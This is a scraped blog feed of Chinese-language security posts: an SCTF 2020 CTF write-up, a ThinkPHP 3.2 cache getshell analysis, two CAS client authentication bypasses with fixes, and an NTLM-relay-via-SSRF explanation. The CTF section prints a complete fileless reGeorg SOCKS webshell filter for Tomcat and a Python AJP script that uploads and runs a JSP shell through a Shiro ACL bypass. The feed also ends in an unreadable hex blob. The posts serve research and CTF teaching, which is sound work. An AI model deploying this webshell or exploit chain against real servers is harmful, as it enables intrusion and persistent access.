time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) print(start_time,end_time) f = open('/tmp/cas.txt', 'w') f.write(base64.b64encode(payload)) f.close() 通过jrmp出来fuzz gadget也很方便，这里用的是JDK7u21（在自己做的时候发现统一端口请求一次jrmp之后，后面的再一次请求会变得很慢，这里可以选择再跑一个端口出来交替使用）。接下来就是常见的读取数据库连接字符串查用户登陆的操作了，在此不细表。 Login Me Again - shiro rce &amp;&amp; shiro bypass acl（白盒） 这道题，由我和@leixiao合作完成，前半部分shiro不出网rce利用由leixiao负责完成，后半部分shiro bvpass acl部分由我负责完成。 先贴一个当时构思这道题时候的速记（有删改）： 环境：外网一个有shiro rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。 攻击思路 1.通过注入有socks5代理功能的webshell代理到内网。 2.找shiro新的权限绕过方法或者谷歌搜到我之前找的shiro ajp越权：https://issues.apache.org/jira/browse/SHIRO-760，越权上传文件或者用c0ny1师傅的姿势。 3.用ajp漏洞包含刚才上传的图片rce 利用难点：1.市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。2.自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。3.市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。 下面就从利用难点，逐一说明 无文件socks5代理 因为这里是shiro，shiro本身也是一个filter，所以内存马最好也搞成filter(优先级最高)，内存马的思路可以看基于Tomcat无文件Webshell研究。至于具体filter的逻辑，改一下reg就好了，下面贴一下leixiao师傅的代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138package reGeorg;import javax.servlet.*;import java.io.IOException;public class MemReGeorg implements javax.servlet.Filter{ private javax.servlet.http.HttpServletRequest request = null; private org.apache.catalina.connector.Response response = null; private javax.servlet.http.HttpSession session =null; @Override public void init(FilterConfig filterConfig) throws ServletException { } public void destroy() {} @Override public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException { javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1; javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1; javax.servlet.http.HttpSession session = request.getSession(); String cmd = request.getHeader(&quot;X-CMD&quot;); if (cmd != null) { response.setHeader(&quot;X-STATUS&quot;, &quot;OK&quot;); if (cmd.compareTo(&quot;CONNECT&quot;) == 0) { try { String target = request.getHeader(&quot;X-TARGET&quot;); int port = Integer.parseInt(request.getHeader(&quot;X-PORT&quot;)); java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open(); socketChannel.connect(new java.net.InetSocketAddress(target, port)); socketChannel.configureBlocking(false); session.setAttribute(&quot;socket&quot;, socketChannel); response.setHeader(&quot;X-STATUS&quot;, &quot;OK&quot;); } catch (java.net.UnknownHostException e) { response.setHeader(&quot;X-ERROR&quot;, e.getMessage()); response.setHeader(&quot;X-STATUS&quot;, &quot;FAIL&quot;); } catch (java.io.IOException e) { response.setHeader(&quot;X-ERROR&quot;, e.getMessage()); response.setHeader(&quot;X-STATUS&quot;, &quot;FAIL&quot;); } } else if (cmd.compareTo(&quot;DISCONNECT&quot;) == 0) { java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(&quot;socket&quot;); try{ socketChannel.socket().close(); } catch (Exception ex) { } session.invalidate(); } else if (cmd.compareTo(&quot;READ&quot;) == 0){ java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(&quot;socket&quot;); try { java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512); int bytesRead = socketChannel.read(buf); ServletOutputStream so = response.getOutputStream(); while (bytesRead &gt; 0){ so.write(buf.array(),0,bytesRead); so.flush(); buf.clear(); bytesRead = socketChannel.read(buf); } response.setHeader(&quot;X-STATUS&quot;, &quot;OK&quot;); so.flush(); so.close(); } catch (Exception e) { response.setHeader(&quot;X-ERROR&quot;, e.getMessage()); response.setHeader(&quot;X-STATUS&quot;, &quot;FAIL&quot;); } } else if (cmd.compareTo(&quot;FORWARD&quot;) == 0){ java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(&quot;socket&quot;); try { int readlen = request.getContentLength(); byte[] buff = new byte[readlen]; request.getInputStream().read(buff, 0, readlen); java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen); buf.clear(); buf.put(buff); buf.flip(); while(buf.hasRemaining()) { socketChannel.write(buf); } response.setHeader(&quot;X-STATUS&quot;, &quot;OK&quot;); } catch (Exception e) { response.setHeader(&quot;X-ERROR&quot;, e.getMessage()); response.setHeader(&quot;X-STATUS&quot;, &quot;FAIL&quot;); socketChannel.socket().close(); } } } else { filterChain.doFilter(request, response); } } public boolean equals(Object obj) { Object[] context=(Object[]) obj; this.session = (javax.servlet.http.HttpSession ) context[2]; this.response = (org.apache.catalina.connector.Response) context[1]; this.request = (javax.servlet.http.HttpServletRequest) context[0]; try { dynamicAddFilter(new MemReGeorg(),&quot;reGeorg&quot;,&quot;/*&quot;,request); } catch (IllegalAccessException e) { e.printStackTrace(); } return true; } public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException { javax.servlet.ServletContext servletContext=request.getServletContext(); if (servletContext.getFilterRegistration(name) == null) { java.lang.reflect.Field contextField = null; org.apache.catalina.core.ApplicationContext applicationContext =null; org.apache.catalina.core.StandardContext standardContext=null; java.lang.reflect.Field stateField=null; javax.servlet.FilterRegistration.Dynamic filterRegistration =null; try { contextField=servletContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); contextField=applicationContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(&quot;state&quot;); stateField.setAccessible(true); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP); filterRegistration = servletContext.addFilter(name, filter); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url}); java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(&quot;filterStart&quot;); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext, null); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); }catch (Exception e){ ; }finally { stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } } }} ajp越权的shiro acl 这一点后面的提示也给出来了，可以用how-to-detect-tomcat-ajp-lfi-more-accurately提到的办法，也可以用我之前提交的SHIRO-760。poc在issue里面已经给了，漏洞的demo环境在我github上可以找到，这里借这个机会分享一下当时挖掘的思路。 通过分析前人的文章可以知道，我们可以知道在org.apache.shiro.web.util.WebUtils#getPathWithinApplication内部会对requestUri进行提取并交给patchMatches匹配以判断是否需要鉴权。 多次步入后，可以看到具体的获取uri的实现是其中的getRequestUri。getRequestUri首先会获取javax.servlet.include.request_uri的值如果获取到了就不会进入 if (uri == null) 。 而如果有师傅看过shiro上一次对越权的修复的话会发现，补丁是打在if (uri == null)中的，通过ajp控制javax.servlet.include.request_uri相当于绕过上一次的补丁点。 接着这里提取出来的uri/;/admin/page会进入decodeAndCleanUriString中进行清洗。decodeAndCleanUriString会取分号前的内容返回。 在这里返回的就是/，后面shiro的正则/admin/*自然也就拦截不了。 此外，光绕过shiro还不行，spring不解析这条路由也没用，一个开始我也为用前人文章中的 /xxxx;/../ 可以轻松绕过，黑盒发现并不行。分析ajp漏洞的时候我们知道，tomcat先调用对所有filter进行过滤然后会调用对应的servlet，而在spring都是统一由DispatcherServlet进行统一调度的。所以一开始我选择把断点打到org.springframework.web.servlet.FrameworkServlet#doGet（DispatcherServlet继承FrameworkServlet）。又因为spring是通过HandlerMapping来找对应的控制器，所以步入断点之后就开始找哪个地方有这个逻辑。最后在/org/springframework/web/servlet/DispatcherServlet.class:484找到。 步入之后spring把已经注册过Mapping轮询一次。在代码中我们用的@GetMapping这里就对应ReuqestMappingHandlerMapping。 步入ReuqestMappingHandlerMapping之后再多次步入，最后来到org.springframework.web.util.UrlPathHelper#getPathWithinApplication 这里三个箭头是关键的三个点，第一个箭头会对uri提取并“消杀”，第二个箭头会去pathWithinApp中servletPath之后的内容。第三个箭头返回path交给HandlerMapping匹配。 我们先来看第一个箭头“消杀”的步骤。 上图removeSemicolonContent会移除uri中;，/;/admin/page变为//admin/page。getSanitizedPath会对移除重复的/， //admin/page 变为 /admin/page （ps：这里并不会处理…及.这也是为啥老payload /xxx;/…/无法用的原因，虽然可以绕过但是之后spring handlerMapping匹配不到。） 再来第二个箭头，这个getRemainingPath会提取处Uri中conextPath之后的部分。举个反例如果我们把javax.servlet.include.servlet_path设置为/，那么返回给HandlerMapping将会是 admin/page ，而HandlerMapping只会匹配/admin/page这也是为什么javax.servlet.include.servlet_path需要置为空的原因。 回过头看漏洞本质还是在于spring和shiro在规范消杀url时标准不一致造成的问题。因为最新版的tomcat已经默认把ajp关了，并且在反代情况下tomcat 8009也不会对外开放所以这个洞的利用还是受很大限制的。 ajp上传文件 因为网上ajp协议讨论较少，和exp有关的只有CVE-2020-1938，不过payload的构造比较单一并不涉及到上传文件的请求，网上应该也没有介绍相关的文章。那要怎么通过ajp传？我预想的思路是选手通过阅读相关类库来解决比如AJPy，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作，可以借鉴。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sysimport osfrom io import BytesIOfrom ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundExceptionfrom tomcat import Tomcattarget_host = &quot;127.0.0.1&quot;gc = Tomcat(target_host, 8009)filename = &quot;shell.jpg&quot;payload = &quot;&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\\&quot;cat /flag.txt\\&quot;).getInputStream())).readLine()); %&gt;&quot;with open(&quot;/tmp/request&quot;, &quot;w+b&quot;) as f: s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\\r\\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;%s&quot;\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n' % filename s_form_footer = '\\r\\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\\r\\n' f.write(s_form_header.encode('utf-8')) f.write(payload.encode('utf-8')) f.write(s_form_footer.encode('utf-8'))data_len = os.path.getsize(&quot;/tmp/request&quot;)headers = { &quot;SC_REQ_CONTENT_TYPE&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;: &quot;%d&quot; % data_len,}attributes = [ { &quot;name&quot;: &quot;req_attribute&quot; , &quot;value&quot;: (&quot;javax.servlet.include.request_uri&quot;, &quot;/;/admin/upload&quot;, ) } , { &quot;name&quot;: &quot;req_attribute&quot; , &quot;value&quot;: (&quot;javax.servlet.include.path_info&quot;, &quot;/&quot;, ) } , { &quot;name&quot;: &quot;req_attribute&quot; , &quot;value&quot;: (&quot;javax.servlet.include.servlet_path&quot;, &quot;&quot;, ) }, ]hdrs, data = gc.perform_request(&quot;/&quot;, headers=headers, method=&quot;POST&quot;, attributes=attributes)with open(&quot;/tmp/request&quot;, &quot;rb&quot;) as f: br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER) responses = br.send_and_receive(gc.socket, gc.stream)r = AjpResponse()r.parse(gc.stream)shell_path = r.data.decode('utf-8').strip('\\x00').split('/')[-1]print(&quot;=&quot;*50)print(shell_path)print(&quot;=&quot;*50)gc = Tomcat('127.0.0.1', 8009)attributes = [ {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.request_uri&quot;, &quot;/&quot;,)}, {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.path_info&quot;, shell_path,)}, {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.servlet_path&quot;, &quot;/&quot;,)},]hdrs, data = gc.perform_request(&quot;/uploads/1.jsp&quot;, attributes=attributes)output = sys.stdoutfor d in data: try: output.write(d.data.decode('utf8')) except UnicodeDecodeError: output.write(repr(d.data))","link":"/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"title":"TP框架3.2缓存漏洞","text":"何为缓存？ 具体http://www.thinkphp.cn/code/1579.html 简单的说就是减少服务器压力，将用户常见的的网页事先静态存储好。个人认为，一般情况下TP用的是数据缓存，即将数据缓存到一个php文件中，文件名包含一个id来唯一标示（TP中是一个md5值） 搭建环境 配置数据库 12345CREATE database articleCREATE TABLE article (content VARCHAR(255));'DB_NAME' =&gt; 'aritcle' -- 在config.php中添加该键值对 写入代码 修改home/controller/indexController.class.php 如下 123456789101112131415161718&lt;?phpnamespace Home\\Controller;class IndexController { function index(){ echo &quot;welcome&quot;; } function save(){ $content = array('content' =&gt; I('get.content')); $amodel = M('article'); $amodel-&gt;data($content)-&gt;add(); } function cache(){ $amodel = M('article'); $content = $amodel-&gt;select(); var_dump($content); S('content',$content,3600); }} 缓存函数用法 在TP3.2版本中，起缓存功能的是S函数，用法如下 123456// 使用data标识缓存$Data数据S('data',$Data); //前面的是缓存标示，后面的是缓存的数据// 缓存$Data数据3600秒S('data',$Data,3600);// 删除缓存数据S('data',NULL); //第一个参数时缓存的标识名 下面为第一次创建缓存（理想情况下）的代码跟踪 跟进S函数 12345678910111213141516171819202122/** * 缓存管理 * @param mixed $name 缓存名称，如果为数组表示进行缓存设置 * @param mixed $value 缓存值 * @param mixed $options 缓存参数 * @return mixed */function S($name,$value='',$options=null) { static $cache = ''; /*省略*/ }elseif(empty($cache)) { // 自动初始化 $cache = Think\\Cache::getInstance();//创建缓存时从这里进入 } if(''=== $value){ // 获取缓存 return $cache-&gt;get($name); }elseif(is_null($value)) { // 删除缓存 return $cache-&gt;rm($name); }else { // 缓存数据 /*省略*/ return $cache-&gt;set($name, $value, $expire); }} 创建缓存时进入Think\\Cache::getInstance()，这个方法检索静态数组是否已经有缓存实例，如果有就返回，没有则创建。 123456789101112131415/** * 取得缓存类实例 * @static * @access public * @return mixed */static function getInstance($type='',$options=array()) { static $_instance = array();//静态变量，储存所有创建的缓存实例 $guid = $type.to_guid_string($options);//返回一个md5编号，以待稍后作为数组键值 if(!isset($_instance[$guid])){//如果缓存实例不存在则创建 $obj = new Cache(); $_instance[$guid] = $obj-&gt;connect($type,$options); } return $_instance[$guid];} md5标识号生成方式 123456789101112/** * 根据PHP各种类型变量生成唯一标识号 * @param mixed $mix 变量 * @return string */function to_guid_string($mix) { /*省略*/ } else { $mix = serialize($mix); } return md5($mix);//返回一个序列化的md5值} 跟进$obj-&gt;connect($type,$options);这个方法是在配置一些初始值，比如缓存的类型，路径信息 1234567891011121314151617/** * 连接缓存 * @access public * @param string $type 缓存类型 * @param array $options 配置数组 * @return object */public function connect($type='',$options=array()) { if(empty($type)) $type = C('DATA_CACHE_TYPE');//如果为$type空，默认缓存类型为FILE $class = strpos($type,'\\\\')? $type : 'Think\\\\Cache\\\\Driver\\\\'.ucwords(strtolower($type)); if(class_exists($class)) $cache = new $class($options); // 实例化Think\\Cache\\Driver\\FILE else E(L('_CACHE_TYPE_INVALID_').':'.$type); return $cache;} 最后一步写入缓存 123456789101112131415161718/** * 写入缓存 * @access public * @param string $name 缓存变量名 * @param mixed $value 存储数据 * @param int $expire 有效时间 0为永久 * @return boolean */public function set($name,$value,$expire=null) { /*省略*/ $filename = $this-&gt;filename($name);//生成文件名，理想情况下MD5('content') /*省略*/ $data = serialize($value); /*省略*/ $data = &quot;&lt;?php\\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\\n?&gt;&quot;; $result = file_put_contents($filename,$data); /*省略*/} 关键点在&lt;?php\\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\\n?&gt; 理想情况下这里的利用条件得天独厚，因为两个尖括号都写好了，不用担心I函数过滤的问题。而其中的data就是传入进去的一句话： 在Runtime/Temp下 getshell 最后 文中一直提到是理想情况，这里解释一下，跟踪的时候省略了一些代码，其中有的是利用的前提条件，举个例子，文中提到理想情况下webshell文件名是MD5(‘content’)即9a0364b9e99bb480dd25e1f0284c8555/原因是TP中有一个给MD5值加盐的参数可以在配置文件中申明DATA_CACHE_KEY，如果管理员事先设置了这个参数，文件名就会变得不可猜，具体如下 还有一些前提条件，例如Runtime不在web目录内，一般情况也是利用不了的。 如何出错，恳请指点","link":"/2017/08/20/TP%E6%A1%86%E6%9E%B63.2%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"},{"title":"Two Tricks Of CAS-CLIENT AUTH Bypass","text":"首发于先知社区 cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。 bypass trick1 ignorePattern 场景 /api/admin这个url是需要cas登陆才能访问的。 1234567891011121314package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController { @RequestMapping(&quot;/api/admin&quot;) public String admin(){ return &quot;hello admin&quot;; }} /api/guest这个是公共页面，所有人都可以看。 1234567891011121314package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class GuestController { @RequestMapping(&quot;/api/guest&quot;) public String guest(){ return &quot;hello guest&quot;; } } 假设此程序的技术比较老旧，为了实现上面这种需求，那么开发可能会在web.xml中这么配置。 1234567891011121314151617181920&lt;filter&gt; &lt;filter-name&gt;CAS Authentication Filter&lt;/filter-name&gt; &lt;filter-class&gt;org.jasig.cas.client.authentication.AuthenticationFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;casServerUrlPrefix&lt;/param-name&gt; &lt;param-value&gt;https://battags.ad.ess.rutgers.edu:8443/cas&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;serverName&lt;/param-name&gt; &lt;param-value&gt;http://www.acme-client.com&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;ignorePattern&lt;/param-name&gt; &lt;param-value&gt;/api/guest&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;CAS Authentication Filter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 这样配置看起来似乎没有问题 利用 但是其实可以被花式绕过。 原理 原因有两点，第一org.jasig.cas.client.authentication.AuthenticationFilter，在匹配时候获取了原生url（未处理…/），甚至包括? 后的内容。 第二，filter的匹配模式有四种，默认是按正则匹配。 同理如果配置成CONTAINS也会有类似的问题。 同理封装了这个库的三方库也会有问题，比较流行的是**cas-client-autoconfig-support** ，它常与springboot集成使用，如果有如下配置也会出问题。 1cas.ignorePattern=/api/guest 修复 所以正确的配置应该改为 1234&lt;init-param&gt; &lt;param-name&gt;ignorePattern&lt;/param-name&gt; &lt;param-value&gt;^/api/guest$&lt;/param-value&gt;&lt;/init-param&gt; 个人认为这个可以算洞（没处理…/而且contains这种选项就不应该存在），也可以甩锅给开发没仔细看文档。 bypass trick2 useSuffixPatternMatch 场景 这里假设/admin系列的路由都不允许访问。 1234567891011121314151617181920212223242526package today.redteam.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController { @RequestMapping( value = {&quot;/admin&quot;}, method = {RequestMethod.GET} ) public String admin(){ return &quot;hello admin&quot;; } @RequestMapping( value = {&quot;/admin/api&quot;}, method = {RequestMethod.GET} ) public String admin1(){ return &quot;hello admin1&quot;; }} 这一次开发认真看了文档做了以下配置。 1234567891011121314151617181920212223242526package today.redteam.config;import net.unicon.cas.client.configuration.CasClientConfigurerAdapter;import net.unicon.cas.client.configuration.EnableCasClient;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Configuration;import today.redteam.aop.CasAspect;@Configuration@EnableCasClientpublic class CasConfig extends CasClientConfigurerAdapter { public CasConfig() { } public void configureAuthenticationFilter(FilterRegistrationBean authenticationFilter) { super.configureAuthenticationFilter(authenticationFilter); authenticationFilter.addUrlPatterns(new String[]{&quot;/admin/*&quot;}); } static { System.setProperty(&quot;cas.serverUrlPrefix&quot;, &quot;https://cashost.com/cas&quot;); System.setProperty(&quot;cas.serverLoginUrl&quot;, &quot;https://cashost.com/cas/login&quot;); System.setProperty(&quot;cas.clientHostUrl&quot;, &quot;http://localhost:8888/&quot;); System.setProperty(&quot;cas.validationType&quot;, &quot;CAS&quot;); }} /admin这个路由看起来似乎也没有什么问题。 常规的绕过方式也不起作用 利用 但在低版本的springboot上还是能绕过（本地环境是1.5.9.RELEASE）。 原理 原理是在springboot 1.x中useSuffixPatternMatch默认为true，springboot会对路由进行正则匹配。 断点下在org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPattern。 /admin.*自然能匹配上/admin.也就绕过了。 修复 如下关闭setUseSuffixPatternMatch或升级到2.x 12345678910111213141516171819202122package today.redteam.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerMapping;import org.springframework.web.servlet.config.annotation.EnableWebMvc;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;@Configuration@ComponentScan@EnableWebMvcpublic class AppConfig { @Bean public HandlerMapping requestMappingHandlerMapping() { RequestMappingHandlerMapping mapping = new RequestMappingHandlerMapping(); mapping.setUseSuffixPatternMatch(false); return mapping; }}","link":"/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/"},{"title":"Using Java&#39;s SSRF vulnerability rce via ntlm relay","text":"环境搭建 实验室环境说明 • 6.1.7601 Service Pack 1 Build 7601 • jdk1.7.0_80 • 工作组环境 实验代码 12345678910111213141516171819202122232425&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;&lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.net.URLConnection&quot; %&gt;&lt;% String ssrf = request.getParameter(&quot;ssrf&quot;); URL url = new URL(ssrf); URLConnection connection = url.openConnection(); connection.setRequestProperty(&quot;user-agent&quot;, &quot;javasec&quot;); connection.setConnectTimeout(1000); connection.setReadTimeout(1000); connection.connect(); connection.getHeaderFields(); connection.getInputStream(); StringBuilder resp = new StringBuilder(); BufferedReader in = new BufferedReader( new InputStreamReader(connection.getInputStream())); String line; while ((line = in.readLine()) != null) { resp.append(&quot;/n&quot;).append(line); } System.out.print(resp.toString());%&gt; 漏洞复现 使用ultrarelay监听端口，访问url http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1触发ssrf漏洞时可以看到已经把受害机的ntlm hash拿到了。 原理分析 本质上就是一次从http到smb跨协议ntlm relay本机，但是我们知道在 MS16-075之后微软修复了http-&gt;smb的本机relay。所以为了绕过这个限制需要将type2(NTLMSSP_CHALLENGE)Negotiate Flags中的0x00004000设置为0，但是设置为0后会出现另外一个问题那就是MIC验证会不通过，为了绕过这个限制又需要把type2 Negotiate Flags中的Negotiate Always Sign设置为0。 响应victim401并开启ntlm认证 victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victim，重点就在这步在给victim的http应答中将0x00004000和Negotiate Always Sign都设置为了0。 victim-&gt; http NTLMSSP_AUTH -&gt;hacker hacker-&gt; smb NTLMSSP_AUTH -&gt;victim 后面认证成功后，响应victim 404，并连接victim的IPC$进行后续rce操作。 成功条件 • http-&gt;smb未打新补丁 • 工作条件环境下需要administrator（sid 500） • 一个ssrf或者xxe的点 参考 Ntlm Relay is dead, Long Live Ntlm Relay Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know ntlmrelay","link":"/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/"},{"title":"Why did I buy INTC stock in Sep 2024","text":"f8c89326e2dd27398d7b0a10fab7ffc5bbe7003240d706b98f5c34f6af465a7f8b3722f5e90c29961d9f8f4a455241c4eed99ab7cd5987b8f0a9067048b30b04c0b9a6295fb86caeb7d1d9e3a0112d8d59aa86ecd9b0603fe8d84b64dfce1a3e651275e60c7e4fa376d1bd526063a70980dafceeb4e29d78fda5a669b3996005eb2d7739aea79a60d429433b53c60827b2fc416ead2dc73148b8e2606c9f96abcc78124ecd5b69bd86f63826b10aca639969c64271c2bfbb1dbed0edf14173f84b4c3a087bfbbd465e717d123df0afe2bd1db5870294f0fae9b309f3b6f948ebf321d14e1f8c7e91f1ef8f3d9b5e768af2c8512a2fab7c7d44fc29426d5818a14aea29e97954e617b8d7f705751cda575131dbfa0b82b990d2898408e3eb6271066ab13bc9cdeb878e871254a3dffc4b9fde45c4a834ca0218757593f900a7444dab788047fe61b6d64e38f9f37a69f5b881f24739bf2c66e7c4c7203fd9b7430ca5da00b89e66ee2c73afaa9c504477ff019853fa1f43a9e9a93f03d9ea2520fc539fc2683e0083c12a604a9b17fdbcef47371963a30a2df713f3c09945bcaa812c12cf2da0a434bfe39d0b7862fbc66aeffcb3f2597027a5255560f40599a7a2f16881428185f74a4a34e45753306a7b3edfe855d6b2bce59a477cd96a311d8b2e35db05b60b531a2c3d2f9f72c2aa0ff4f5c5838cdb269b75d530452fdd1830002de35f4efa5788ad40f1e1cdeb7a24f34fd6e6615e0e9488897c921afc4dfbe9e6acd47465c98f55b5a0aadb3561b1ae68c4be148544515531a77b9e5487e7fdeb4998b5b6741fe99ac6cad33bfd5f8a898c2d07e01413fdcd1593095dccfecb5fd7607b99d2779f4cf0a985bba498c648de8444c0607a6b6d53b879be85f730e2e8b047741c2d5f78917bc53360b068460032d24213812a91ac5bdd0086b6bd6aeefdb069fbd13cb8545b9997f5e43e770822a6603c7bd9872a4de2ae3fc55e70814281d15cf866ec1fa4b1cf25a53b10ad1304a66a99ab5ebc23a89a70711a38bb9f35f747dc3c21a7802b2e3a601d76d55875afaa2bcc067f933130b821ee200adf86d6d3eea16a1dfd185b89012ebabce2df02f793e3f049adad72d1fa472fb2ee0af68aaa359ce8d66c7baba0b7e610ca147ff867cd8a091fce9ccdcbf4e17009eb0fe558c19e0082ddf7775ad9f9d2e63cfd72f07ae7cda3cfa3f7efa95962a083c5ed5855e81bfd1aeeeca167532f737496d60e5ff3ef7835c455f8d65fe07537cb34bb1c648b179f73980bd2fb3db117c8311452fb4f871822c1a9985a849a84d6667f974539fb4b759b6e77470c51a26cbb087f31ca381d3e04795b41fee495e599b49c80603c0197c0824112b2ebf03ba174734d392087de7e19c8a9d7566e441bc949dba6f5cd2e7300aede46822bf35d57f958cfc2300ee180e9480ecbdb9b9bdc2b5fb21c1ea26286105a436d9c087d721dda8587fa3c9420870b7d70ff90a6622b88ce774a4236ef073003c2ca8920c28676c3a7ad58412f2a56f5910e2479627bbb7232075d1221ff3720103b531f28976be17795bad46b76041c1a74f30dfabbb5f24fdfa99d270d5243e699d4a272280d0cea33bdb24a58e73dd5258593a5734ec275939c97c493cd6ba3425a4f9231c8d83fdddbad7b1fd562d857889d13145b314c88a9f6695e652035f790df3e88d0fefe6cf27717b413949a58c0040fbd9ae5129bf96c9320f2b0341c47e3752b4fe55ed658af81d4a129043d29ac6fa2a79e81343b3efc508ccf1cf63a92da16c56a78fb03d76b4950e630f0e11cbb2eb99e13d3a15c3359429cee52fab0bc11116b5bc05166b55e21c7c7978c10ef2ae009a4ef308ee2ff719d93afd8525a33af60dd8995c0a6389e46b7cc1e7ea86fee79d6c6ded61511b65958ee58e4e170048ac658ab7efa0d82f60059821d1080dde1f09a73b1b36337106fd8e8ec2ed761e2f8d7f96c411174fda6e83ea503885c87d17523f83b581bad9246a0d4d7b346148209499678ce9d9d4445ef0c9d663534216c526d7a3d2d95c51e53f9736d54cb04b27af90d1e07a8fa2bc02e664153058ae35e8ce14c93826625b8e5c93b382ef207e4dfebc3f9b7577bd0182694c8023876cd1e4d1d2d4f70f1894458badac5d27da515e4d17c2659346ddf54c46eaef9831309823a3a8f84dd88135c852855f4d8836a434763e63489d1c0a7aaa61f1f8215fc7445e6998e84e43afed36443ae779d969c63a243013dbef5688ba1e24736febfc2bb73409844824e5a1b2fa6658db873e83882d738b9a729288d96087ad4944247e6420e4eb75b136cf62d06895cbb0310ba0b8c7c8495ba5a82128c7240768fac5f173745936c0c5f2dc2d80a7e64b69b54007b41d2ebec6d3370350daa9bcdf8d571013c975676f472fafbc854510a3ca536f9f49bf4631a6112c8322cbdf1ec3d904e36f42de766a792bb959b2d4709bd278d66a20a0cd0b821a49233d3f